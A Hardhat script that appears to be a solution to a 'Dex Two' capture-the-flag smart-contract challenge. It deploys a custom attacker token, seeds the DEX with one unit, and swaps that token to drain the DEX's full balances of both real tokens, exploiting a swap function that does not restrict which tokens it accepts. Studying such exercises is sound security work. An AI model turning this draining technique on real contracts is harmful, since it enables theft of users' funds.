const {ethers} = require("hardhat");
require('dotenv').config()

async function main() {
  const user = new ethers.Wallet(process.env.PRIVATE_KEY, ethers.provider);
  const DexTwo = await ethers.getContractFactory("DexTwo");
  const Token = await ethers.getContractFactory("SwappableToken");
  const dex_two = DexTwo.attach(process.env.DEX_TWO_ADDR);
  console.log(`token1: ${ await dex_two.token1() }, token2: ${ await dex_two.token2() }`);
  const token1 = Token.attach(await dex_two.token1());
  const token2 = Token.attach(await dex_two.token2());
  console.log(`dex_two: ${ dex_two.address }, user: ${ user.address }`);

  const HackerToken = await ethers.getContractFactory("DexTwoHackerToken");
  const hackerToken = await HackerToken.deploy();
  await hackerToken.deployed();

  let tx = await hackerToken.approve(dex_two.address, 10000);
  await tx.wait();
  tx = await hackerToken.transfer(dex_two.address, 1);
  await tx.wait();
  tx = await dex_two.swap(hackerToken.address, token1.address, await hackerToken.balanceOf(dex_two.address));
  await tx.wait();
  tx = await dex_two.swap(hackerToken.address, token2.address, await hackerToken.balanceOf(dex_two.address));
  await tx.wait();

  console.log(`dex_two token1 balance: ${await dex_two.balanceOf(token1.address, dex_two.address)}`);
  console.log(`dex_two token2 balance: ${await dex_two.balanceOf(token2.address, dex_two.address)}`);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
